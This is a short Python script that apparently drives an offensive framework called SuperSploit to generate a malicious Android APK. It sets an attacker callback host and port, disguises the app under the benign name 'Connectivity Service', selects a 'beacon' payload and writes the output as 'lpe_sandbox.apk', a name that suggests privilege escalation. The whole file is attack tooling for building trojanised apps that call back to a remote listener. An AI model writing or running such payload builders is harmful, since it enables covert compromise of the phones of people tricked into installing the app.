import sys
import os

# Add source directory to path
sys.path.append(os.path.abspath("/home/donald/.SuperSploit/source"))

from core.native_apk_generator import NativeApkGenerator
from core.database import DatabaseManagment

# Set some dummy variables for the generator
db = DatabaseManagment.get()
db["LHOST"] = "192.168.37.158"
db["LPORT"] = "5000"
db["APP_NAME"] = "Connectivity Service"
db["APK_ARCH"] = "armv7" # Match target architecture
db["ANDROID_PAYLOAD_TYPE"] = "beacon" # Use beacon template for game stub

generator = NativeApkGenerator(
    output_apk_path="/home/donald/.SuperSploit/payloads/lpe_sandbox.apk",
    app_name="Connectivity Service",
    template_path="templates/payload/native_gen/native_packet_socket.c"
)

generator.generate()
